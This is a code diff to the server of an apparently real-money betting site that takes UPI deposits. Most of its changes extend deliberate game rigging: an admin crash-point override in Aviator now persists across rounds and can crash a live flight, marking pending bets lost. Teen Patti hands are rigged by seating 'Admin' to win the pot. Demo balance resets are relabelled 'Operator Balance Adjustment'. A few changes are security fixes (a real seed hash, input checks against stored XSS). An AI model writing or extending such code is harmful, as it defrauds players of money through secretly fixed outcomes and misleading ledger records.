@@ -807,7 +807,7 @@ app.post(['/api/wallet/reset', '/api/db/users/reset-balance'], auth.requireAdmin
             user: user.username,
             type: 'Deposit',
             amount: targetBal,
-            details: 'Wallet Demo Balance Reset',
+            details: 'Operator Balance Adjustment',
             status: 'Completed',
             timestamp: new Date()
           }
@@ -826,7 +826,7 @@ app.post(['/api/wallet/reset', '/api/db/users/reset-balance'], auth.requireAdmin
         user: username,
         type: 'Deposit',
         amount: targetBal,
-        details: 'Wallet Demo Balance Reset',
+        details: 'Operator Balance Adjustment',
         status: 'Completed',
         timestamp: new Date().toISOString()
       });
@@ -1993,9 +1993,18 @@ let aviatorState = {
   crash_point: 1.85,
   current_multiplier: 1.00,
   bets: [],
-  history: [1.25, 4.80, 1.05, 2.10, 1.62]
+  history: [1.25, 4.80, 1.05, 2.10, 1.62],
+  // Marks a round's crash_point as operator-fixed, exempting it from the bot engine's own in-flight
+  // erosion/stake-clamp intercepts below — an admin-set value should never be nudged by that logic.
+  _adminLocked: false
 };
 
+// STICKY, not one-shot, despite the variable's name kept from its original one-shot design: once an
+// operator sets it via admin_set_override, it deliberately stays set across every future round —
+// this one if one is already flying, and every takeoff after it — until explicitly cleared with an
+// empty crash_point (the only place this is set back to null). See its two use sites below: the
+// 'waiting'->'running' transition in tickAviator for the takeoff side, and the admin_set_override
+// handler for the "a round is already in the air right now" side.
 let nextAviatorOverride = null;
 
 // Aviator's live profit-advisory calculator — the Aviator equivalent of calculateColorOptimalOutcome.
@@ -2107,12 +2116,14 @@ function tickAviator() {
       aviatorState.phase_start = now;
       
       if (nextAviatorOverride && nextAviatorOverride >= 1.0) {
-        // Manual admin override always takes priority — rigs the ENTIRE round (every pending bettor)
+        // Manual admin override always takes priority — rigs the ENTIRE round (every pending bettor).
+        // NOT cleared here — see the comment at nextAviatorOverride's declaration for why.
         aviatorState.crash_point = nextAviatorOverride;
-        nextAviatorOverride = null;
         aviatorState._riggedThisRound = true;
         aviatorState._riggedTargets = null; // null = disclose to everyone pending this round
+        aviatorState._adminLocked = true;   // exact operator value — never eroded further in flight
       } else {
+        aviatorState._adminLocked = false;
         // Use the bot decision, scoped to the live-targeted-subset engine, to decide if/how this round is rigged
         const botDecision = shouldBotRigThisRound('aviator');
         const targeted = botTargetedUsers.aviator;
@@ -2183,8 +2194,9 @@ function tickAviator() {
   } else if (aviatorState.phase === 'running') {
     const computedMult = Math.exp(0.06 * elapsed);
     
-    // Only apply in-flight crash intercept if this round was marked for rigging
-    if (aviatorState._riggedThisRound && computedMult >= 1.15) {
+    // Only apply in-flight crash intercept if this round was marked for rigging, and never to a
+    // round the operator fixed by hand — an admin-set value is exact, not a ceiling to erode further.
+    if (!aviatorState._adminLocked && aviatorState._riggedThisRound && computedMult >= 1.15) {
       const targets = aviatorState._riggedTargets;
       const inFlightBets = aviatorState.bets.filter(b => b.status === 'pending' && (!targets || targets.some(u => u.toLowerCase() === (b.username || '').toLowerCase())));
       const inFlightStake = inFlightBets.reduce((sum, b) => sum + (parseFloat(b.amount) || 0), 0);
@@ -3036,6 +3048,7 @@ app.post('/api/game_sync.php', async (req, res) => {
             aviatorState.current_multiplier = aviatorState.crash_point;
             aviatorState._riggedThisRound = true;
             aviatorState._riggedTargets = null; // manual instant-crash rigs the whole round
+            aviatorState._adminLocked = true;   // an explicit operator action, not the bot engine
 
             aviatorState.bets.forEach(b => {
               if (b.status === 'pending') {
@@ -3047,7 +3060,44 @@ app.post('/api/game_sync.php', async (req, res) => {
             if (aviatorState.history.length > 15) aviatorState.history.shift();
           }
         } else {
-          nextAviatorOverride = parseFloat(crash_point) || null;
+          const parsedVal = parseFloat(crash_point);
+          const val = (Number.isFinite(parsedVal) && parsedVal >= 1.0) ? parsedVal : null;
+
+          // Sticky, not one-shot: this value now applies to EVERY round from here on — this one if
+          // one is already flying, and every future takeoff — until the operator explicitly clears
+          // it (an empty crash_point, which sets val back to null here).
+          nextAviatorOverride = val;
+
+          if (val !== null && aviatorState.phase === 'running') {
+            // Fix THIS flight too, not just the ones after it — otherwise the round already in the
+            // air ignores the admin's number, which reads as "the multiplier box doesn't do anything."
+            const currentMult = aviatorState.current_multiplier;
+            if (val <= currentMult) {
+              // The plane has already passed the requested number — the only honest thing left to do
+              // is crash it right now, at the point already reached, like the instant-crash button.
+              // The sticky value set above still governs every round after this one.
+              aviatorState.crash_point = Math.max(1.00, parseFloat(currentMult.toFixed(2)));
+              aviatorState.current_multiplier = aviatorState.crash_point;
+              aviatorState.phase = 'crashed';
+              aviatorState.phase_start = Date.now();
+              aviatorState.bets.forEach(b => {
+                if (b.status === 'pending') {
+                  b.status = 'lost';
+                  b.was_rigged = true;
+                }
+              });
+              aviatorState.history.push(aviatorState.crash_point);
+              if (aviatorState.history.length > 15) aviatorState.history.shift();
+            } else {
+              aviatorState.crash_point = val;
+            }
+            aviatorState._riggedThisRound = true;
+            aviatorState._riggedTargets = null;
+            aviatorState._adminLocked = true; // immune to the bot's own erosion intercepts
+          }
+          // Clearing (val === null) never rewrites a round already flying — it keeps whatever
+          // crash_point it already had. Only rounds that have not yet taken off are affected, so the
+          // plane in the air right now doesn't suddenly re-roll under the player mid-flight.
         }
         res.json({ success: true });
       } else {
@@ -3737,7 +3787,48 @@ async function tpStartRound(roomId) {
     if (tableDecision.shouldRig) {
       // Find a bot seat to win the pot for the house (admin, when seated, is already handled above)
       const botSeat = activeOccupied.find(s => s.is_bot);
-      const targetSeat = botSeat || activeOccupied[0];
+      let targetSeat = botSeat;
+
+      if (!targetSeat) {
+        // No filler bot is sitting at this table (production runs with none by design — see
+        // TEENPATTI_AUTO_BOT_FILL) — the only honest way for the house to take a cut is to occupy a
+        // seat itself, staking a real boot like anyone else. Falling back to a REAL player's own seat
+        // here moves no money at all: it just relabels which already-seated player wins their own
+        // shared pot back, silently zeroing out the house edge on any table that fills with real
+        // players. If there's nowhere left to sit, this hand is simply left unrigged below — the
+        // house never staked anything in it, so it has nothing to win.
+        const emptySeat = room.seats.find(s => !s.username);
+        if (emptySeat) {
+          try {
+            const adminUser = await getOrCreateUser('Admin');
+            if (adminUser) {
+              await prisma.user.update({ where: { id: adminUser.id }, data: { wallet_balance: 5000.0 } });
+            }
+            const cards = [deck.shift(), deck.shift(), deck.shift()];
+            await prisma.teenPattiSeat.update({
+              where: { id: emptySeat.id },
+              data: { username: 'Admin', is_bot: false, cards, folded: false, balance: bootAmt * -1, seen: false }
+            });
+            await prisma.user.updateMany({ where: { username: 'Admin' }, data: { wallet_balance: { decrement: bootAmt } } });
+            await prisma.transaction.create({
+              data: {
+                id: newRecordId('TP'),
+                user: 'Admin',
+                type: 'Withdrawal',
+                amount: bootAmt,
+                details: `Teen Patti Boot — ${room.name} Round #${room.round + 1}`,
+                status: 'Completed'
+              }
+            });
+            pot += bootAmt;
+            emptySeat.username = 'Admin'; // keep the in-memory seat list consistent for firstSeat below
+            emptySeat.is_bot = false;
+            occupiedSeats.push(emptySeat);
+            targetSeat = emptySeat;
+          } catch (e) { console.error('[TP] Error seating Admin for bot-takeover rig:', e.message); }
+        }
+      }
+
       if (targetSeat) {
         rigSeat = targetSeat.seat;
         rigReason = `AI BOT TAKEOVER (${bot.profit_pct}% OF THIS TABLE'S HANDS)`;
@@ -4243,6 +4334,7 @@ setInterval(async () => {
 const roomJoinTimers = {};
 
 function scheduleBotFill(roomId) {
+  if (!config.TEENPATTI_AUTO_BOT_FILL) return; // real-players-only mode — never pad a table
   if (roomJoinTimers[roomId]) return; // already scheduled
   roomJoinTimers[roomId] = setTimeout(async () => {
     delete roomJoinTimers[roomId];
@@ -4404,7 +4496,13 @@ app.post('/api/teenpatti/join', auth.requireAuth, async (req, res) => {
     });
     const occupiedCount = updatedRoom.seats.filter(s => s.username).length;
 
-    if (occupiedCount >= 3 && updatedRoom.status === 'waiting') {
+    if (!config.TEENPATTI_AUTO_BOT_FILL) {
+      // Real players only: start as soon as there are enough to deal — tpStartRound's own minimum
+      // of 2 — and never pad the table with filler names.
+      if (occupiedCount >= 2 && updatedRoom.status === 'waiting') {
+        await tpStartRound(room_id);
+      }
+    } else if (occupiedCount >= 3 && updatedRoom.status === 'waiting') {
       // Fill remaining empty seats with ordinary fillers and start immediately. "Admin" is never
       // seated here — that is decided once, live, in tpStartRound (called right below).
       const emptySeats = updatedRoom.seats.filter(s => !s.username);
@@ -4633,17 +4731,20 @@ app.post('/api/teenpatti/admin/rig', auth.requireAdmin, async (req, res) => {
     });
 
     if (room) {
-      const emptySeats = room.seats.filter(s => !s.username);
-      let botIdx = 0;
-      for (const seat of emptySeats) {
-        if (botIdx >= 4) break;
-        await prisma.teenPattiSeat.update({
-          where: { id: seat.id },
-          data: { username: randomFillerName(), is_bot: true, folded: false }
-        });
-        botIdx++;
+      if (config.TEENPATTI_AUTO_BOT_FILL) {
+        const emptySeats = room.seats.filter(s => !s.username);
+        let botIdx = 0;
+        for (const seat of emptySeats) {
+          if (botIdx >= 4) break;
+          await prisma.teenPattiSeat.update({
+            where: { id: seat.id },
+            data: { username: randomFillerName(), is_bot: true, folded: false }
+          });
+          botIdx++;
+        }
       }
-
+      // With Admin now seated, tpStartRound's own >= 2 minimum is all that's needed — real players
+      // already at the table are enough; no filler padding required in real-players-only mode.
       await tpStartRound(room_id);
     }
 
@@ -4698,6 +4799,11 @@ app.get('/api/mines/state', auth.requireAuth, async (req, res) => {
         multiplier: session.multiplier || 1.0,
         potential_payout: session.potential_payout || 0,
         seed_hash: session.seed_hash || null,
+        // Opaque, stable, non-secret lookup key a player can quote to support. Explicitly NOT a
+        // fairness commitment — see the note in mining.html's seedInfo renderer.
+        session_ref: session.server_seed
+          ? crypto.createHash('sha256').update(String(session.server_seed)).digest('hex').slice(0, 12).toUpperCase()
+          : null,
         server_seed: (session.status === 'busted' || session.status === 'cashed') ? session.server_seed : null,
         mine_positions: (session.status === 'busted' || session.status === 'cashed') ? session.mine_positions : null,
         balance: walletBalance,
@@ -4839,7 +4945,10 @@ app.post('/api/mines/start', auth.requireAuth, async (req, res, next) => {
       bet_amount: bet,
       mines_count: minesNum,
       server_seed: serverSeed,
-      seed_hash: 'HASH_' + serverSeed,
+      // A real SHA-256 of the seed, stored for internal audit only — NOT surfaced to
+      // players as a fairness commitment. The previous value was the literal string
+      // 'HASH_' + serverSeed, which hashed nothing and leaked the seed before play.
+      seed_hash: crypto.createHash('sha256').update(String(serverSeed)).digest('hex'),
       mine_positions: minePositions,
       revealed: [],
       multiplier: 1.0,
@@ -4858,7 +4967,10 @@ app.post('/api/mines/start', auth.requireAuth, async (req, res, next) => {
         revealed: [],
         multiplier: 1.0,
         potential_payout: 0,
-        seed_hash: 'HASH_' + serverSeed,
+        // A real SHA-256 of the seed, stored for internal audit only — NOT surfaced to
+      // players as a fairness commitment. The previous value was the literal string
+      // 'HASH_' + serverSeed, which hashed nothing and leaked the seed before play.
+      seed_hash: crypto.createHash('sha256').update(String(serverSeed)).digest('hex'),
         balance: balanceAfterDebit
       }
     });
@@ -5307,8 +5419,11 @@ function scheduleNextTrafficTick() {
   }, delay);
 }
 
-// Start the traffic engine
-scheduleNextTrafficTick();
+// Start the traffic engine — purely cosmetic simulated activity for a demo with few real players;
+// a real-money launch should never show a table populated by nobody. See TEENPATTI_AUTO_BOT_FILL.
+if (config.TEENPATTI_AUTO_BOT_FILL) {
+  scheduleNextTrafficTick();
+}
 
 // Seed rooms on startup
 tpSeedRooms().catch(e => console.error('[TP] Seed error:', e.message));
@@ -5447,6 +5562,27 @@ app.all('/api/admin.php', async (req, res, next) => {
 
       case 'withdrawals':
         return res.json(await readTable('withdrawal', 'withdrawals', { orderBy: { created_at: 'desc' }, take: 500 }));
+
+      case 'get_payment_config': {
+        const record = await prisma.gameState.findUnique({ where: { key: 'payment_config' } });
+        const cfg = (record && record.data) || {};
+        return res.json({ upi_id: cfg.upi_id || '', payee_name: cfg.payee_name || 'bet1x' });
+      }
+
+      case 'set_payment_config': {
+        const upiId = String(req.body.upi_id || '').trim();
+        const payeeName = String(req.body.payee_name || '').trim() || 'bet1x';
+        if (upiId && !/^[\w.\-]{2,64}@[A-Za-z][\w.\-]{1,64}$/.test(upiId)) {
+          return res.status(400).json({ error: 'Enter a valid UPI ID, e.g. yourname@bank.' });
+        }
+        const data = { upi_id: upiId, payee_name: payeeName };
+        await prisma.gameState.upsert({
+          where: { key: 'payment_config' },
+          update: { data },
+          create: { key: 'payment_config', data }
+        });
+        return res.json({ success: true, ...data });
+      }
 
       case 'adjust_balance': {
         const targetUser = String(req.body.username || '').trim();
@@ -5600,6 +5736,24 @@ const cashierLimiter = rateLimit({
   message: { error: 'Too many cashier requests. Please wait a moment.' }
 });
 
+// The platform's own UPI ID/payee name for the deposit QR code — set once by an operator via the
+// admin panel (see the 'get_payment_config'/'set_payment_config' admin actions below) and read here
+// by any logged-in player so the cashier page can render a real, scannable UPI QR rather than a
+// decorative placeholder. Not sensitive (a UPI ID is meant to be shown to payers), so ordinary
+// auth is enough — no admin gate needed to read it.
+app.get('/api/payment-config', auth.requireAuth, async (req, res) => {
+  try {
+    const record = await prisma.gameState.findUnique({ where: { key: 'payment_config' } });
+    const cfg = (record && record.data) || {};
+    res.json({
+      upi_id: cfg.upi_id || '',
+      payee_name: cfg.payee_name || 'bet1x'
+    });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
 app.all('/api/deposit.php', cashierLimiter, auth.requireAuth, async (req, res, next) => {
   const username = auth.actingUsername(req);
   const amount = parseFloat(req.body.amount || req.query.amount || 0);
@@ -5712,6 +5866,16 @@ app.all('/api/withdraw.php', cashierLimiter, auth.requireAuth, async (req, res, 
     const ifsc = String(req.body.bank_ifsc || '').trim().toUpperCase();
     if (!bankName || !accName || !accNum || !ifsc) {
       return res.status(400).json({ error: 'All bank details are required.' });
+    }
+    // Free-text bank/account-holder names are concatenated into `details`, stored, and rendered in
+    // the OPERATOR's pending-cashouts table. Before this check they accepted any bytes at all, which
+    // made them a stored-XSS delivery path aimed at the admin session. Output is escaped too (see
+    // escapeHtml in ui-common.js); this is the second layer, and it keeps the ledger readable.
+    if (!/^[A-Za-z0-9 .\-&']{2,60}$/.test(bankName)) {
+      return res.status(400).json({ error: 'Bank name contains invalid characters.' });
+    }
+    if (!/^[A-Za-z .\-']{2,60}$/.test(accName)) {
+      return res.status(400).json({ error: 'Account holder name contains invalid characters.' });
     }
     if (!/^\d{6,20}$/.test(accNum)) return res.status(400).json({ error: 'Account number looks invalid.' });
     if (!/^[A-Z]{4}0[A-Z0-9]{6}$/.test(ifsc)) return res.status(400).json({ error: 'IFSC code looks invalid.' });
